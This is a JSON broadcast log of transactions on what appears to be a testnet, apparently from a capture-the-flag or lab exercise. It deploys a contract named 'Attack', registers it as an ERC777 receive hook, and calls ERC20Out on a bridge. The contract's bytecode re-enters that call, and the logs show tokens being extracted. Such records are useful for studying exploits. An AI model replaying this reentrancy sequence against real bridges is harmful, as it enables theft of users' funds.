{
  "transactions": [
    {
      "hash": "0x0f5f84bafa34c969e556c65fee29fb4e85dbf2c9971b1d54c0a2c0d9237e8f6c",
      "transactionType": "CREATE",
      "contractName": "Attack",
      "contractAddress": "0x27290a7452faaae6f6d521d2ad9782532fa244a3",
      "function": null,
      "arguments": [
        "0x4bb324b195FaE8CED6ddD34d01499C0B31AC3480",
        "0x6B5634390791FDd9fec57b6899Fb27af1F64F42d",
        "0x15b12c86e640a3A27C2C9E9DAda40D1EFBf6A555",
        "0xE88150C42CC6c0294dD20893Bf5b1EC6eDD24Fc6"
      ],
      "transaction": {
        "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
        "gas": "0x8b5c8",
        "value": "0x0",
        "input": "0x608060405234801561000f575f5ffd5b5060405161060b38038061060b83398101604081905261002e916100d2565b600280546001600160a01b03199081166001600160a01b03968716179091556001805482169486169490941784556003805482169386169390931790925560048054909216931692831790555f9182527f35caef69825cdb1fbfd221f52a215969ae583b38d7af2e4bc70bda521cf19ba86020526040909120805460ff19169091179055610123565b80516001600160a01b03811681146100cd575f5ffd5b919050565b5f5f5f5f608085870312156100e5575f5ffd5b6100ee856100b7565b93506100fc602086016100b7565b925061010a604086016100b7565b9150610118606086016100b7565b905092959194509250565b6104db806101305f395ff3fe608060405234801561000f575f5ffd5b506004361061007a575f3560e01c806375ab97821161005857806375ab9782146100e25780638525f888146100f7578063d47ef27e146100ff578063e78cea9214610112575f5ffd5b8063125dc3ea1461007e578063249cb3fa146100ae57806348db5f89146100cf575b5f5ffd5b600154610091906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b6100c16100bc366004610349565b610125565b6040519081526020016100a5565b600454610091906001600160a01b031681565b6100f56100f03660046103bc565b61017b565b005b610091610284565b600354610091906001600160a01b031681565b600254610091906001600160a01b031681565b5f828152602081815260408083206001600160a01b038516845290915281205460ff16610152575f610174565b7fa2ef4600d742022d532d4747cb3547474667d6f13804902513b2ec01c848f4b45b9392505050565b6004546001600160a01b0388811691161461027a5760035460025460405163095ea7b360e01b81526001600160a01b0391821660048201526064602482015291169063095ea7b3906044016020604051808303815f875af11580156101e2573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610206919061046b565b506002546003546004805460405163dafac22f60e01b81526001600160a01b039384169281019290925282166024820152606460448201819052919092169163dafac22f91015f604051808303815f87803b158015610263575f5ffd5b505af1158015610275573d5f5f3e3d5ffd5b505050505b5050505050505050565b6004805460405163555ddc6560e11b81526001600160a01b03909116918101919091527f29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe89560248201525f90731820a4b7618bde71dce8cdc73aab6c95905fad249063aabbb8ca90604401602060405180830381865afa158015610309573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061032d919061048a565b905090565b6001600160a01b0381168114610346575f5ffd5b50565b5f5f6040838503121561035a575f5ffd5b82359150602083013561036c81610332565b809150509250929050565b5f5f83601f840112610387575f5ffd5b50813567ffffffffffffffff81111561039e575f5ffd5b6020830191508360208285010111156103b5575f5ffd5b9250929050565b5f5f5f5f5f5f5f5f60c0898b0312156103d3575f5ffd5b88356103de81610332565b975060208901356103ee81610332565b965060408901356103fe81610332565b955060608901359450608089013567ffffffffffffffff811115610420575f5ffd5b61042c8b828c01610377565b90955093505060a089013567ffffffffffffffff81111561044b575f5ffd5b6104578b828c01610377565b999c989b5096995094979396929594505050565b5f6020828403121561047b575f5ffd5b81518015158114610174575f5ffd5b5f6020828403121561049a575f5ffd5b81516101748161033256fea2646970667358221220e38fe56cc6b5718eee63e741c6a211a3813e29702485428ea0815beff4af410c64736f6c634300081b00330000000000000000000000004bb324b195fae8ced6ddd34d01499c0b31ac34800000000000000000000000006b5634390791fdd9fec57b6899fb27af1f64f42d00000000000000000000000015b12c86e640a3a27c2c9e9dada40d1efbf6a555000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
        "nonce": "0x2d",
        "chainId": "0x4268"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x56e5e55e846301557f91b6563f5ea37703a79774aff3ede102183e4e6047fb8a",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x1820a4b7618bde71dce8cdc73aab6c95905fad24",
      "function": "setInterfaceImplementer(address,bytes32,address)",
      "arguments": [
        "0xE88150C42CC6c0294dD20893Bf5b1EC6eDD24Fc6",
        "0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895",
        "0x27290A7452FaAae6f6D521D2AD9782532fa244a3"
      ],
      "transaction": {
        "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
        "to": "0x1820a4b7618bde71dce8cdc73aab6c95905fad24",
        "gas": "0x13e0e",
        "value": "0x0",
        "input": "0x29965a1d000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc629ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe89500000000000000000000000027290a7452faaae6f6d521d2ad9782532fa244a3",
        "nonce": "0x2e",
        "chainId": "0x4268"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0xf6de8704f4b66c14d1380871e9b39bf95c9afa4903a7f452b244cf8f19115c73",
      "transactionType": "CALL",
      "contractName": "Attack",
      "contractAddress": "0x27290a7452faaae6f6d521d2ad9782532fa244a3",
      "function": "isRegister()",
      "arguments": [],
      "transaction": {
        "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
        "to": "0x27290a7452faaae6f6d521d2ad9782532fa244a3",
        "gas": "0xa784",
        "value": "0x0",
        "input": "0x8525f888",
        "nonce": "0x2f",
        "chainId": "0x4268"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x662cf5932c13f2ebb5e0f623c24137bf7d1eb9e7b05835690a1c95dc77795696",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x15b12c86e640a3a27c2c9e9dada40d1efbf6a555",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x27290A7452FaAae6f6D521D2AD9782532fa244a3",
        "100"
      ],
      "transaction": {
        "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
        "to": "0x15b12c86e640a3a27c2c9e9dada40d1efbf6a555",
        "gas": "0x180c3",
        "value": "0x0",
        "input": "0xa9059cbb00000000000000000000000027290a7452faaae6f6d521d2ad9782532fa244a30000000000000000000000000000000000000000000000000000000000000064",
        "nonce": "0x30",
        "chainId": "0x4268"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0xc6d3568d3970cd527ff23b8c337969093fc849986e794a3840a981a2563ee19d",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x15b12c86e640a3a27c2c9e9dada40d1efbf6a555",
      "function": "approve(address,uint256)",
      "arguments": [
        "0x4bb324b195FaE8CED6ddD34d01499C0B31AC3480",
        "100"
      ],
      "transaction": {
        "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
        "to": "0x15b12c86e640a3a27c2c9e9dada40d1efbf6a555",
        "gas": "0x10822",
        "value": "0x0",
        "input": "0x095ea7b30000000000000000000000004bb324b195fae8ced6ddd34d01499c0b31ac34800000000000000000000000000000000000000000000000000000000000000064",
        "nonce": "0x31",
        "chainId": "0x4268"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x85a515ddfd19f28236aeb800f26af3a0ffe42f9e23accc8c3c8a9f001d49accd",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x4bb324b195fae8ced6ddd34d01499c0b31ac3480",
      "function": "ERC20Out(address,address,uint256)",
      "arguments": [
        "0x15b12c86e640a3A27C2C9E9DAda40D1EFBf6A555",
        "0xE88150C42CC6c0294dD20893Bf5b1EC6eDD24Fc6",
        "100"
      ],
      "transaction": {
        "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
        "to": "0x4bb324b195fae8ced6ddd34d01499c0b31ac3480",
        "gas": "0x37150",
        "value": "0x0",
        "input": "0xdafac22f00000000000000000000000015b12c86e640a3a27c2c9e9dada40d1efbf6a555000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc60000000000000000000000000000000000000000000000000000000000000064",
        "nonce": "0x32",
        "chainId": "0x4268"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    }
  ],
  "receipts": [
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x54b12d",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x0f5f84bafa34c969e556c65fee29fb4e85dbf2c9971b1d54c0a2c0d9237e8f6c",
      "transactionIndex": "0x7",
      "blockHash": "0xdb45c58cf669d815bb02368fc192d4d448c6f300aa1b8d4656401887685cf38c",
      "blockNumber": "0x2d50ca",
      "gasUsed": "0x6b338",
      "effectiveGasPrice": "0xbc96d9",
      "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
      "to": null,
      "contractAddress": "0x27290a7452faaae6f6d521d2ad9782532fa244a3"
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x558aa7",
      "logs": [
        {
          "address": "0x1820a4b7618bde71dce8cdc73aab6c95905fad24",
          "topics": [
            "0x93baa6efbd2244243bfee6ce4cfdd1d04fc4c0e9a786abd3a41313bd352db153",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
            "0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895",
            "0x00000000000000000000000027290a7452faaae6f6d521d2ad9782532fa244a3"
          ],
          "data": "0x",
          "blockHash": "0xdb45c58cf669d815bb02368fc192d4d448c6f300aa1b8d4656401887685cf38c",
          "blockNumber": "0x2d50ca",
          "blockTimestamp": "0x676466e8",
          "transactionHash": "0x56e5e55e846301557f91b6563f5ea37703a79774aff3ede102183e4e6047fb8a",
          "transactionIndex": "0x8",
          "logIndex": "0x11",
          "removed": false
        }
      ],
      "logsBloom": "0x00000000020000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002010000020000000000000000000000000000040000000000000000000001000000002000000000000000000000000000000100000000000000000000000000000000000000000200810000000000000000000000000000000000000000000000000000000000000000000000000000000040004010000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x56e5e55e846301557f91b6563f5ea37703a79774aff3ede102183e4e6047fb8a",
      "transactionIndex": "0x8",
      "blockHash": "0xdb45c58cf669d815bb02368fc192d4d448c6f300aa1b8d4656401887685cf38c",
      "blockNumber": "0x2d50ca",
      "gasUsed": "0xd97a",
      "effectiveGasPrice": "0xbc96d9",
      "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
      "to": "0x1820a4b7618bde71dce8cdc73aab6c95905fad24",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x55fd32",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0xf6de8704f4b66c14d1380871e9b39bf95c9afa4903a7f452b244cf8f19115c73",
      "transactionIndex": "0x9",
      "blockHash": "0xdb45c58cf669d815bb02368fc192d4d448c6f300aa1b8d4656401887685cf38c",
      "blockNumber": "0x2d50ca",
      "gasUsed": "0x728b",
      "effectiveGasPrice": "0xbc96d9",
      "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
      "to": "0x27290a7452faaae6f6d521d2ad9782532fa244a3",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x5713c2",
      "logs": [
        {
          "address": "0x15b12c86e640a3a27c2c9e9dada40d1efbf6a555",
          "topics": [
            "0x06b541ddaa720db2b10a4d0cdac39b8d360425fc073085fac19bc82614677987",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
            "0x00000000000000000000000027290a7452faaae6f6d521d2ad9782532fa244a3"
          ],
          "data": "0x00000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0xdb45c58cf669d815bb02368fc192d4d448c6f300aa1b8d4656401887685cf38c",
          "blockNumber": "0x2d50ca",
          "blockTimestamp": "0x676466e8",
          "transactionHash": "0x662cf5932c13f2ebb5e0f623c24137bf7d1eb9e7b05835690a1c95dc77795696",
          "transactionIndex": "0xa",
          "logIndex": "0x12",
          "removed": false
        },
        {
          "address": "0x15b12c86e640a3a27c2c9e9dada40d1efbf6a555",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
            "0x00000000000000000000000027290a7452faaae6f6d521d2ad9782532fa244a3"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000064",
          "blockHash": "0xdb45c58cf669d815bb02368fc192d4d448c6f300aa1b8d4656401887685cf38c",
          "blockNumber": "0x2d50ca",
          "blockTimestamp": "0x676466e8",
          "transactionHash": "0x662cf5932c13f2ebb5e0f623c24137bf7d1eb9e7b05835690a1c95dc77795696",
          "transactionIndex": "0xa",
          "logIndex": "0x13",
          "removed": false
        }
      ],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000400000000080000010000000000000000040000000000000000000000000000002000000000000000000000000000000100100000000000000000000000000008000000000000010000000000000000002000000000000000000000080000000000000000000002000000000000000000004010000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x662cf5932c13f2ebb5e0f623c24137bf7d1eb9e7b05835690a1c95dc77795696",
      "transactionIndex": "0xa",
      "blockHash": "0xdb45c58cf669d815bb02368fc192d4d448c6f300aa1b8d4656401887685cf38c",
      "blockNumber": "0x2d50ca",
      "gasUsed": "0x11690",
      "effectiveGasPrice": "0xbc96d9",
      "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
      "to": "0x15b12c86e640a3a27c2c9e9dada40d1efbf6a555",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x57c85d",
      "logs": [
        {
          "address": "0x15b12c86e640a3a27c2c9e9dada40d1efbf6a555",
          "topics": [
            "0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
            "0x0000000000000000000000004bb324b195fae8ced6ddd34d01499c0b31ac3480"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000064",
          "blockHash": "0xdb45c58cf669d815bb02368fc192d4d448c6f300aa1b8d4656401887685cf38c",
          "blockNumber": "0x2d50ca",
          "blockTimestamp": "0x676466e8",
          "transactionHash": "0xc6d3568d3970cd527ff23b8c337969093fc849986e794a3840a981a2563ee19d",
          "transactionIndex": "0xb",
          "logIndex": "0x14",
          "removed": false
        }
      ],
      "logsBloom": "0x00000000000000000000000000000000800001000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000002000000000000000000000000020000000000000000000000000000000000008000000000000010000000000000000000000000000000000000000080000000000000000000000000000000000010000004000000000000000008000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0xc6d3568d3970cd527ff23b8c337969093fc849986e794a3840a981a2563ee19d",
      "transactionIndex": "0xb",
      "blockHash": "0xdb45c58cf669d815bb02368fc192d4d448c6f300aa1b8d4656401887685cf38c",
      "blockNumber": "0x2d50ca",
      "gasUsed": "0xb49b",
      "effectiveGasPrice": "0xbc96d9",
      "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
      "to": "0x15b12c86e640a3a27c2c9e9dada40d1efbf6a555",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x5a466c",
      "logs": [
        {
          "address": "0x4bb324b195fae8ced6ddd34d01499c0b31ac3480",
          "topics": [
            "0x44b4f910eed5395f84d00285781e37020302f8ae9b632209b4c3eafe05bd2e87",
            "0x00000000000000000000000015b12c86e640a3a27c2c9e9dada40d1efbf6a555",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000064",
          "blockHash": "0xdb45c58cf669d815bb02368fc192d4d448c6f300aa1b8d4656401887685cf38c",
          "blockNumber": "0x2d50ca",
          "blockTimestamp": "0x676466e8",
          "transactionHash": "0x85a515ddfd19f28236aeb800f26af3a0ffe42f9e23accc8c3c8a9f001d49accd",
          "transactionIndex": "0xc",
          "logIndex": "0x15",
          "removed": false
        },
        {
          "address": "0x15b12c86e640a3a27c2c9e9dada40d1efbf6a555",
          "topics": [
            "0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
            "0x0000000000000000000000004bb324b195fae8ced6ddd34d01499c0b31ac3480"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0xdb45c58cf669d815bb02368fc192d4d448c6f300aa1b8d4656401887685cf38c",
          "blockNumber": "0x2d50ca",
          "blockTimestamp": "0x676466e8",
          "transactionHash": "0x85a515ddfd19f28236aeb800f26af3a0ffe42f9e23accc8c3c8a9f001d49accd",
          "transactionIndex": "0xc",
          "logIndex": "0x16",
          "removed": false
        },
        {
          "address": "0x15b12c86e640a3a27c2c9e9dada40d1efbf6a555",
          "topics": [
            "0x06b541ddaa720db2b10a4d0cdac39b8d360425fc073085fac19bc82614677987",
            "0x0000000000000000000000004bb324b195fae8ced6ddd34d01499c0b31ac3480",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
            "0x0000000000000000000000004bb324b195fae8ced6ddd34d01499c0b31ac3480"
          ],
          "data": "0x00000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0xdb45c58cf669d815bb02368fc192d4d448c6f300aa1b8d4656401887685cf38c",
          "blockNumber": "0x2d50ca",
          "blockTimestamp": "0x676466e8",
          "transactionHash": "0x85a515ddfd19f28236aeb800f26af3a0ffe42f9e23accc8c3c8a9f001d49accd",
          "transactionIndex": "0xc",
          "logIndex": "0x17",
          "removed": false
        },
        {
          "address": "0x15b12c86e640a3a27c2c9e9dada40d1efbf6a555",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
            "0x0000000000000000000000004bb324b195fae8ced6ddd34d01499c0b31ac3480"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000064",
          "blockHash": "0xdb45c58cf669d815bb02368fc192d4d448c6f300aa1b8d4656401887685cf38c",
          "blockNumber": "0x2d50ca",
          "blockTimestamp": "0x676466e8",
          "transactionHash": "0x85a515ddfd19f28236aeb800f26af3a0ffe42f9e23accc8c3c8a9f001d49accd",
          "transactionIndex": "0xc",
          "logIndex": "0x18",
          "removed": false
        },
        {
          "address": "0x4bb324b195fae8ced6ddd34d01499c0b31ac3480",
          "topics": [
            "0xbe89fbc5edbebf243cf8cf7946ce755357087079003d51a4eb7c69e987bf0801",
            "0x0000000000000000000000000000000000000000000000000000000000000002",
            "0x0000000000000000000000001bc49ebad8b3407feee810f62a920ef7fd506110",
            "0x0000000000000000000000004bb324b195fae8ced6ddd34d01499c0b31ac3480"
          ],
          "data": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000648a9d3fcf00000000000000000000000015b12c86e640a3a27c2c9e9dada40d1efbf6a555000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6000000000000000000000000000000000000000000000000000000000000006400000000000000000000000000000000000000000000000000000000",
          "blockHash": "0xdb45c58cf669d815bb02368fc192d4d448c6f300aa1b8d4656401887685cf38c",
          "blockNumber": "0x2d50ca",
          "blockTimestamp": "0x676466e8",
          "transactionHash": "0x85a515ddfd19f28236aeb800f26af3a0ffe42f9e23accc8c3c8a9f001d49accd",
          "transactionIndex": "0xc",
          "logIndex": "0x19",
          "removed": false
        },
        {
          "address": "0x4bb324b195fae8ced6ddd34d01499c0b31ac3480",
          "topics": [
            "0x4641df4a962071e12719d8c8c8e5ac7fc4d97b927346a3d7a335b1f7517e133c",
            "0x3505f0c68515567c389e62ae33bfcc23563704023e3a531008253b8da25cf8ed"
          ],
          "data": "0x",
          "blockHash": "0xdb45c58cf669d815bb02368fc192d4d448c6f300aa1b8d4656401887685cf38c",
          "blockNumber": "0x2d50ca",
          "blockTimestamp": "0x676466e8",
          "transactionHash": "0x85a515ddfd19f28236aeb800f26af3a0ffe42f9e23accc8c3c8a9f001d49accd",
          "transactionIndex": "0xc",
          "logIndex": "0x1a",
          "removed": false
        },
        {
          "address": "0x1bc49ebad8b3407feee810f62a920ef7fd506110",
          "topics": [
            "0x44b4f910eed5395f84d00285781e37020302f8ae9b632209b4c3eafe05bd2e87",
            "0x00000000000000000000000015b12c86e640a3a27c2c9e9dada40d1efbf6a555",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000064",
          "blockHash": "0xdb45c58cf669d815bb02368fc192d4d448c6f300aa1b8d4656401887685cf38c",
          "blockNumber": "0x2d50ca",
          "blockTimestamp": "0x676466e8",
          "transactionHash": "0x85a515ddfd19f28236aeb800f26af3a0ffe42f9e23accc8c3c8a9f001d49accd",
          "transactionIndex": "0xc",
          "logIndex": "0x1b",
          "removed": false
        },
        {
          "address": "0x6b5634390791fdd9fec57b6899fb27af1f64f42d",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x0000000000000000000000000000000000000000000000000000000000000000",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000064",
          "blockHash": "0xdb45c58cf669d815bb02368fc192d4d448c6f300aa1b8d4656401887685cf38c",
          "blockNumber": "0x2d50ca",
          "blockTimestamp": "0x676466e8",
          "transactionHash": "0x85a515ddfd19f28236aeb800f26af3a0ffe42f9e23accc8c3c8a9f001d49accd",
          "transactionIndex": "0xc",
          "logIndex": "0x1c",
          "removed": false
        }
      ],
      "logsBloom": "0x14000000000000000000000000000000800001000000000000000000004000000010000000000000000020000000000000000000000000000000000000200000140000800000000000000008000000000000800000000000000000000000000000000000020000400000000000000800000000400000000080000018000020000000000000200000000400000c00000000000002000000000000040000014008020100000100000000000100000000000000008000040000000010000000000000000002080000000000400000040080000000000000000000002000000020000010000004000008000000000008000000000000008000000000000008000008",
      "type": "0x2",
      "transactionHash": "0x85a515ddfd19f28236aeb800f26af3a0ffe42f9e23accc8c3c8a9f001d49accd",
      "transactionIndex": "0xc",
      "blockHash": "0xdb45c58cf669d815bb02368fc192d4d448c6f300aa1b8d4656401887685cf38c",
      "blockNumber": "0x2d50ca",
      "gasUsed": "0x27e0f",
      "effectiveGasPrice": "0xbc96d9",
      "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
      "to": "0x4bb324b195fae8ced6ddd34d01499c0b31ac3480",
      "contractAddress": null
    }
  ],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1734633195,
  "chain": 17000,
  "commit": "58111ea"
}